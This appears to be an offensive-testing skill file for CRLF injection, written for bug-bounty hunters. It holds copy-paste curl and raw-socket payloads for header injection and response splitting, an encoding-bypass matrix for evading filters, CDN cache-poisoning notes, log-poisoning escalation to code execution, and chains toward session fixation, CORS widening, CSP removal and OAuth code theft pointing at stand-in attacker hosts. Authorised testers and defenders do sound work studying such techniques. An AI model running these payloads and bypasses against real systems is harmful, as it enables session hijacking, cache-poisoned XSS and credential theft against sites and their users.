---
name: crlf-injection
category: vulnerabilities
description: CRLF injection for header injection, response splitting, cache poisoning, session fixation, and XSS via Location/Set-Cookie/Content-Type header manipulation
depends_on: []
---

# CRLF Injection

User input flowing into HTTP response headers without stripping `\r\n`. Turns into header smuggling, response splitting, cache poisoning, cookie injection, and in the best case reflected XSS that bypasses CSP because it lives above the body. Most wins today come from CDN/origin splitting and Set-Cookie injection; pure log-line forgery is usually N/A.

## Discovery Signals

| Signal | Where to Find | Why Vulnerable |
|--------|---------------|----------------|
| Redirect param in `Location` header | `?next=`, `?url=`, `?returnTo=`, `?redirect_uri=`, post-login/logout | App concatenates param into header without CRLF strip |
| Language/locale setter in `Set-Cookie` | `?lang=`, `?locale=`, `?currency=` preference endpoints | Cookie value built from param, no newline check |
| Correlation/request ID echoed in response header | `X-Request-Id`, `X-Correlation-Id`, `X-Trace-Id` | Devs trust internal IDs; never sanitize for headers |
| File download with user-controlled filename | `Content-Disposition: attachment; filename=<input>` | Filename param injected verbatim into header |
| API version from user input in header | `X-API-Version`, custom routing headers | Version string reflected without validation |
| Third-party appliance redirect paths | OpenVPN-AS `/__session_start__/`, Citrix `/+CSCOE+/`, F5, Fortinet | Vendor web UIs often skip CRLF sanitization on path segments |
| Reverse proxy forwarding headers trusted | `X-Forwarded-Host`, `X-Forwarded-For` reflected in response | Debug/logging reflects attacker-controlled proxy headers |
| Error pages reflecting URL path | 404 pages, "not found" messages including path in headers | Path segment lands in `Location` redirect without strip |
| Rack 3 / framework API migration paths | Ruby pitchfork, framework version upgrades | Newer API code path skips sanitization the old path had |
| Staging/dev CDN subdomains | `stage-*`, `dev-*`, `staging.*` CDN properties | Looser config, older WAF rules, redirect logic reflects URL components |

## Attack Surface

**Sinks**
- `Location:` from redirect endpoints (`?next=`, `?url=`, `?returnTo=`, `?redirect_uri=`, post-login/post-logout)
- `Set-Cookie:` from preference/session setters (language, currency, theme, consent, tracking ID)
- Custom headers echoing a request ID, correlation ID, trace ID, tenant ID, API version
- `Content-Disposition: attachment; filename=<input>` (filename is the injection surface)
- `Link:` preload/preconnect from user-controlled URLs
- Reverse-proxy `X-Forwarded-*` on logging or reflected debug pages

**Stack patterns that still bleed**
- Hand-rolled redirect handlers (`response.setHeader("Location", req.params.url)`) in Node, Go, old PHP, classic ASP
- CGI/FastCGI scripts writing headers with `printf`
- Older nginx (pre-1.5.1 `$uri` injection class), HAProxy pre-1.5.18, legacy Tomcat versions
- Python frameworks where newlines were silently allowed in custom header setters (pre-3.5 patch)
- Java (`HttpServletResponse.setHeader`) pre-Tomcat 9 / Jetty fixes for strict mode

**Soft signals while probing**
- Reflected parameter appears on a response line you can see in raw curl (`Location:`, `Set-Cookie:`)
- Route takes URL and calls an upstream service that echoes it back in a header
- Multi-tier architecture: CDN → WAF → app; any one layer may normalize differently

## High-Value Targets

### Open redirect → Location header split

- `GET /redir?url=https://evil.com%0d%0aSet-Cookie:sess=attacker`
- Confirms with raw response carrying two headers on separate lines.

### OAuth callback / post-login redirect

- `?next=/%0d%0aSet-Cookie:oauth_state=attacker` — fixates state, lines up CSRF on the OAuth dance.
- `?redirect_uri=...` splits with an injected `Location:` that bypasses allowlist checks done pre-split.

### CDN cache poisoning

- Inject `Content-Type: text/html` and a body to the response, then get the CDN to cache it under an attacker-chosen path.
- Cloudflare, Fastly, Varnish, Akamai: depends on whether the CDN parses the smuggled second response or the first.

### Set-Cookie injection

- `%0d%0aSet-Cookie:session=<attacker>; Path=/; HttpOnly` — session fixation or cookie-scoping attacks.
- `%0d%0aSet-Cookie:__Host-csrf=; Path=/; Max-Age=0` — wipe CSRF token, then CSRF becomes exploitable.

### Header-based XSS / filter disable

- `%0d%0aX-XSS-Protection: 0%0d%0aContent-Security-Policy:` — clears CSP and legacy XSS filter for a follow-up payload.
- In old IE / legacy clients: `%0d%0a%0d%0a<script>...</script>` body injection.

## Key Vulnerabilities

### HTTP Response Splitting

```
GET /redirect?url=https://evil.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>XSS</html> HTTP/1.1
```

Two responses leave the origin. The cache/proxy may desync and serve the second one to a later request for a sibling path.

### Header-only injection (no body split)

- Adds a header the app did not intend. Still payable if the header changes behavior:
  - `Set-Cookie:` — fixation, wipe, or scope extension (`Domain=target.com`)
  - `Location:` — redirect to attacker
  - `Access-Control-Allow-Origin: *` — loosen CORS on a sensitive endpoint
  - `Refresh: 0; url=https://evil` — meta-refresh-like behavior in some clients

### Location allowlist bypass via split

The app validates `url` starts with `https://target.com`, then sets the header; CRLF in the tail injects a second `Location:` that wins in some clients.

### Cookie scoping attack

Inject `Set-Cookie` with `Domain=.target.com; Path=/`. If the app's cookie was `Path=/user/<id>`, the injected one is visible from every path and overrides on read.

## Test Payloads (copy-paste, single quote for the shell)

Baseline probe:
```bash
curl -sgi "https://target/redir?url=https://example.com%0d%0aX-Pwn:1"
# look for "X-Pwn: 1" on its own line in the raw response
```

Set-Cookie injection:
```bash
curl -sgi "https://target/lang?set=en%0d%0aSet-Cookie:session=attacker_fixated"
```

Response splitting (plain):
```bash
curl -sgi "https://target/go?u=https://a.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>PoC</h1>"
```

Raw bytes when percent-encoding is stripped:
```bash
printf 'GET /go?u=https://a.com\r\nX-Inject:1 HTTP/1.1\r\nHost: target\r\n\r\n' | \
  openssl s_client -quiet -connect target:443
```

Key curl flags:
- `-g` disables globbing so `[` `]` `{` `}` pass through
- `-i` prints headers (required to see the injection)
- `--path-as-is` stops curl from normalizing `%2e%2e` / CR/LF away

## Encoding Exhaustion Matrix

| Encoding | Payload | When It Works |
|----------|---------|---------------|
| Canonical CRLF | `%0d%0a` | Default first test; works on unpatched stacks |
| Uppercase | `%0D%0A` | Filters matching lowercase hex only |
| LF only | `%0a` | Most stacks treat LF as line terminator even without CR; highest hit rate |
| CR only | `%0d` | IIS, old ASP, some custom parsers |
| Double encode | `%250d%250a` | Proxy decodes once, app decodes again; common on multi-tier |
| Unicode CRLF class | `%E5%98%8A%E5%98%8D` | Filter sees non-ASCII, backend lowercases/normalizes to `\r\n` |
| Overlong UTF-8 | `%c0%8d%c0%8a` | Legacy C decoders accept 2-byte encoding of single-byte chars |
| JSON string escape | `\r\n` literal in JSON body | JSON-parsed input flows to header sink without re-encoding |
| Null + CRLF | `%00%0d%0a` | Null short-circuits C-string length checks; CRLF survives past |
| Space-padded | `%0d%20%0a` | Evades regex `%0d%0a`; space is stripped by some header parsers |
| Tab prefix | `%09%0d%0a` | Evades regex anchored on start; tab ignored by HTTP parsers |
| HTML entity | `&#13;&#10;` | XML/HTML parsed contexts that decode entities before header emit |
| Header folding | `%0a%20` | Obsolete HTTP/1 folding; some middleware still unfolds into new header |

## CDN/Proxy Differential Behavior

| CDN/Proxy | CRLF Handling | Exploitation Opportunity |
|-----------|---------------|--------------------------|
| Cloudflare | Strips `\r\n` in most request paths; Transform Rules `concat()` with hex escapes can bypass | Test `concat()` hex-escape path if customer uses Transform Rules |
| Fastly/Varnish | VCL custom logic may not sanitize; backend response CRLF cached as-is | Poison via origin response split; Fastly caches the first response |
| Akamai | Edge sanitizes request headers; response headers from origin pass through to cache | Inject at origin; Akamai caches the split response for the CDN POP |
| AWS CloudFront | Strips most control chars in request; origin response cached verbatim | Origin-side CRLF poisons CloudFront cache; survives TTL |
| Azure CDN | Strips CRLF in request path; response headers from origin not re-validated | Same as CloudFront: origin-side injection caches through |
| nginx | `$uri` pre-1.5.1 was injectable; modern strips in proxy_pass but not all rewrite contexts | Test `$uri` in custom rewrite/return rules; LF-only often survives |
| HAProxy | Pre-1.5.18 allowed CRLF in `http-request set-header`; modern strict | Check version via `Server:` or error pages; old versions widespread |
| Apache | mod_userdir CVE-2016-4975; modern `ap_escape_html` strips headers | Third-party modules (mod_rewrite custom rules) may still pass through |
| Envoy | Strict header validation by default; rejects requests with CRLF in headers | Low-value target unless custom Lua/Wasm filter skips validation |
| Traefik | Passes through backend response headers without re-sanitization | Origin-side CRLF reaches client through Traefik unchanged |

## Header Injection Impact Matrix

| Header | Injection Impact | Severity |
|--------|------------------|----------|
| `Set-Cookie` | Session fixation, CSRF token wipe, cookie scoping (`Domain=.target.com`) | High |
| `Location` | Open redirect, OAuth code theft, allowlist bypass via second Location | High |
| `Access-Control-Allow-Origin` | CORS bypass → cross-origin data read with credentials | High |
| `Content-Security-Policy` | CSP removal → unblocks otherwise-neutralized reflected XSS | High |
| `X-XSS-Protection: 0` | Disables legacy browser XSS filter for follow-up payload | Medium |
| `Content-Type` | MIME confusion → `text/html` on JSON/text endpoint → XSS | Medium |
| `Refresh` | Client-side redirect (`0; url=https://evil`) without JS | Medium |
| `Link` | Preload injection → force browser to fetch attacker resource | Medium |
| `X-Frame-Options` removal | Removes clickjacking protection via empty/conflicting header | Medium |
| `Transfer-Encoding` | Request smuggling crossover if injected in request-side CRLF | Critical |

## Log Injection Escalation

When CRLF reaches logs only (not HTTP headers), escalate before closing as Informational:

| Escalation Path | Technique | Impact |
|-----------------|-----------|--------|
| SIEM/Splunk injection | Forge fake log entries matching alert rules; inject `severity=CRITICAL action=login_success user=admin` | Hide real attacks or trigger false incident response |
| Apache/nginx access log → LFI | Inject PHP/SSI payload into access log via User-Agent; chain with LFI (`?file=/var/log/apache2/access.log`) | RCE via log poisoning + file include |
| Audit log forgery | Inject fake admin action lines (`admin deleted user X at timestamp Y`) | Compliance violation, attribution confusion |
| Monitoring/metrics manipulation | Inject fake status codes or response times into structured logs | Alerting blind spots, SLA manipulation |
| Email template via logged fields | User-Agent or Referer logged and later included in admin notification email templates | Phishing from legitimate internal email |

## Framework Vulnerability Status

| Framework | Patched Version | Status | Notes |
|-----------|----------------|--------|-------|
| Node.js | v4.6.0+ (2016) | Patched | `http.ServerResponse` rejects `\r\n` in header values; old LTS still in production |
| Python stdlib | 3.5+ (2015) | Patched | `http.client` raises on CRLF; third-party libs (requests, aiohttp) may differ |
| Go `net/http` | 1.11+ (2018) | Patched | `Header.Set` rejects newlines; pre-1.11 silently allowed |
| Ruby `net/http` | 2.5+ | Patched | Client-side header injection fixed; server-side depends on app server |
| PHP | 5.4.38+ / 5.5.22+ / 5.6.6+ | Patched | `header()` rejects CRLF; but frameworks using raw socket/stream may bypass |
| Java Tomcat | 9.0+ strict | Patched | Strict mode rejects; permissive mode (default pre-9) allows |
| Java Jetty | 9.4.11+ | Patched | Rejects CRLF in response headers |
| .NET/ASP.NET | Core 2.0+ | Patched | Kestrel rejects; IIS in-process may differ |
| Rust (hyper) | All versions | Safe | Type system prevents CRLF in header values at compile time |
| Ruby pitchfork + Rack 3 | Fixed post-Shopify report | Was vulnerable | Rack 3 array path skipped sanitization Rack 2 string path had |

## Bypass Techniques

**Encoding variants** — try each on blocked inputs
- `%0d%0a` (canonical), `%0D%0A` (uppercase)
- `%0a` alone — many stacks treat LF as end-of-line even without CR
- `%0d` alone — rarer but seen on IIS/old ASP
- Double encode: `%250d%250a` (decoded once by proxy, once by app)
- Unicode / overlong UTF-8: `%E5%98%8A%E5%98%8D` (the Unicode CRLF class U+560A U+560D) — filter sees non-ASCII, sink lowers it to `\r\n`
- Raw non-HTTP: `
` in JSON bodies parsed to header sinks
- Tab prefix: `%20%09` before the payload to evade naive regex anchored on colon

**Transport-level**
- HTTP/2 to HTTP/1.1 downgrade: a `\r\n` in an HTTP/2 pseudo-header can be rewritten by the proxy into two HTTP/1 headers (request smuggling class; similar principle).
- HTTP/1.1 chunk extension: `;x=\r\nX-Inject:1`

**Parser differentials**
- CDN strips CRLF; origin does not — payload arrives intact
- Origin strips CRLF on `Location` but not on custom `X-*` headers
- Language-level: Go `http.Header.Set` pre-1.11 allowed newlines; Node pre-patch 15 did too

**Case / delimiter tricks**
- `%0a%20Set-Cookie:...` — leading space on next line = header folding (obsolete but still parsed by some middleware into a new header)
- Null byte + CRLF: `%00%0d%0a` to short-circuit length checks

## Testing Methodology

1. **Enumerate reflection points** — every `?redirect=`, `?url=`, `?next=`, preference setters, tenant IDs. Run burp/zap collab + reflection rules to catch less obvious ones.
2. **Probe baseline** — `%0d%0aX-Crlf-Probe:1` on each param; grep the raw response for `X-Crlf-Probe: 1` on a new line. If you see it, the sink is vulnerable.
3. **Classify the sink** — is it `Location:`, `Set-Cookie:`, a custom header, or body reflection inside a header? That decides your payload.
4. **Try encodings** — canonical → uppercase → LF only → double encode → Unicode overlong. Record which one the stack accepts.
5. **Escalate** — from header injection to response splitting (add `Content-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\n...`). Confirm with raw socket or `curl -i`.
6. **Test caching layer** — repeat with `Cache-Control: public, max-age=600` injected. Hit the URL from a second IP / browser to see if the poisoned response comes back.
7. **Chain** — Set-Cookie fixation, CORS loosening, or CSP removal all enable downstream finds.
8. **Record raw response** — triagers need raw bytes, not screenshots. Paste the full HTTP response with the injected line on its own line.

## Validation

1. Raw HTTP response showing the injected header on its own line (not continuation of another header).
2. For splitting: two `HTTP/1.1` status lines visible, or a cache HIT on a sibling URL returning the injected body.
3. For Set-Cookie injection: browser devtools Application tab showing the attacker cookie stored under the target origin.
4. Repeat the request in a clean session to rule out reflection from your own fixed state.
5. If the finding depends on a specific proxy behavior, name the proxy (`Server:`, `Via:`, `X-Served-By:`) in the report.

## False Positives

- Reflection into body only, not into headers — that is XSS/HTML injection, not CRLF.
- Framework silently strips `\r\n` before setting the header (Python 3.5+ `http.client`, Node post-patch, Go `net/http` modern) — probe shows the value but no new line. Not reportable.
- WAF returns 400 on CRLF bytes before origin sees them — not vulnerable unless you find an encoding that slips past.
- Injection appears in logs only (log injection) — most programs mark this Informational unless you can demonstrate log-based pivot (SIEM alert suppression, fake audit entry that triggers an action).
- Response shows `\\r\\n` literal — the stack escaped it. Not reportable.
- Triager pushback: "requires attacker-controlled cookie/cache" — preempt by showing a second-visitor PoC (a clean browser hitting the poisoned URL).

## Chaining

- **CRLF → Set-Cookie → session fixation → ATO**: inject session cookie → victim visits link → victim's session is attacker's session → attacker logs back in with same cookie after victim authenticates.
- **CRLF → response splitting → cache poisoning → stored XSS for all users**: poison a cached error page or a common static-looking endpoint with HTML body.
- **CRLF → CORS widening → cross-origin read**: inject `Access-Control-Allow-Origin: https://evil` + `Access-Control-Allow-Credentials: true`, then fetch victim data from attacker origin.
- **CRLF → CSP removal → reflected XSS works**: many apps have XSS in body blocked only by CSP; CRLF can null out CSP and unblock.
- **CRLF → Location override → OAuth token theft**: injected `Location:` beats validated one, redirect_uri trick swipes the authorization code to attacker.
- **CRLF in `X-Forwarded-Host` → password reset poisoning**: if reset email templating uses the header, attacker-controlled host lands in the reset link.

## Impact

- Stored XSS via cache-poisoned response served to every user of a CDN POP
- Session fixation / session hijack via injected `Set-Cookie`
- OAuth authorization-code theft via spoofed `Location`
- CSP / XSS-filter disablement enabling otherwise-blocked reflected XSS
- Cookie scoping escalation (Domain widening) allowing cross-subdomain theft
- Password reset poisoning if a user-controlled header is trusted in email templates

## Pro Tips

1. Always test `%0a` alone — it works on more stacks than the full `%0d%0a` and evades filters that only match the canonical sequence.
2. Use `curl -i --path-as-is -g` — normalizers strip the payload before it leaves your machine otherwise.
3. If the origin strips CRLF but the CDN does not re-normalize on its way back, you may still poison at the cache layer.
4. `Set-Cookie` injection is almost always payable — even without splitting. Fixation + downgrade of a `__Host-` cookie is a clean impact story.
5. Custom headers (`X-Request-Id`, `X-Tenant`) are common blind spots; devs sanitize `Location` but trust correlation-ID values.
6. Content-Disposition filename injection is a separate bug class but often sits in the same code path — probe both.
7. Watch for HTTP/2 downgrade at the edge: the `\r\n` payload can survive as two headers when a proxy rewrites to HTTP/1.1 backend.
8. If you cannot split, document the raw header-injection impact (cookie, CORS, CSP) — it is still payable.
9. Test CRLF in WebSocket `Upgrade` request headers — `Sec-WebSocket-Protocol` and `Sec-WebSocket-Extensions` values flow through different parsing than standard HTTP headers; many proxies skip sanitization on upgrade paths.
10. CRLF in email fields (`To`, `CC`, `Subject`, `Reply-To`) is SMTP injection — RFC quoted-local-part (`"\r\nRCPT TO:<attacker>"@domain`) bypasses email validators while injecting SMTP commands. Test every email-sending feature.
11. Test request-side CRLF (not just response): `\r\n` in request headers to the backend can cause request splitting/smuggling, especially through reverse proxies that reconstruct HTTP/1 from parsed components.
12. HTTP/2 CONTINUATION frames can carry header fragments that bypass CRLF checks applied only to HEADERS frames — test on HTTP/2-native backends behind HTTP/1 proxies.
13. When CRLF only works in path segments (not query params), try vendor appliance paths: OpenVPN-AS `/__session_start__/`, Citrix, F5, Fortinet, Pulse Secure all have known-injectable redirect endpoints.

## Summary

CRLF bugs live where user input lands in a header. Baseline probe, sink classification, encoding sweep, then escalate to Set-Cookie or split. Pay attention to the CDN/origin boundary — the most durable impact (cache poison, fixation) lives in the differential between the two parsers.
